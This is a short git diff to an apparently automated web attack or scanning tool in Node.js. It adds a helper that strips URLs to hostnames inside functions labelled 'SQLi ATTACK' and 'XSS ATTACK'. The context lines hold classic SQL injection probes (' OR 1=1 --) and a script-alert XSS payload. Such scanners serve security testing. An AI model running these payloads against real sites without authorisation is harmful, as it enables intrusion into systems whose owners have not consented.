@@ -1,3 +1,11 @@
+const normalizeTarget = (target) => {
+    try {
+        const url = new URL(target);
+        return url.hostname;
+    } catch {
+        return target.replace(/^https?:\/\//, "");
+    }
+};
 const axios = require("axios");
 
 // ----------------------
@@ -16,7 +24,7 @@ const extractParams = (url) => {
 // SQLi ATTACK (FAST + SINGLE PATH)
 // ----------------------
 const runSQLi = async (target, links = []) => {
-
+    target = normalizeTarget(target);
     const payloadPair = {
         truePayload: "' OR 1=1 --",
         falsePayload: "' AND 1=2 --"
@@ -78,7 +86,7 @@ const runSQLi = async (target, links = []) => {
 // XSS ATTACK (FAST + SINGLE PATH)
 // ----------------------
 const runXSS = async (target, links = []) => {
-
+    target = normalizeTarget(target);
     const payload = "<script>alert(1)</script>";
 
     let paths = links.filter(l => l.includes("?"));
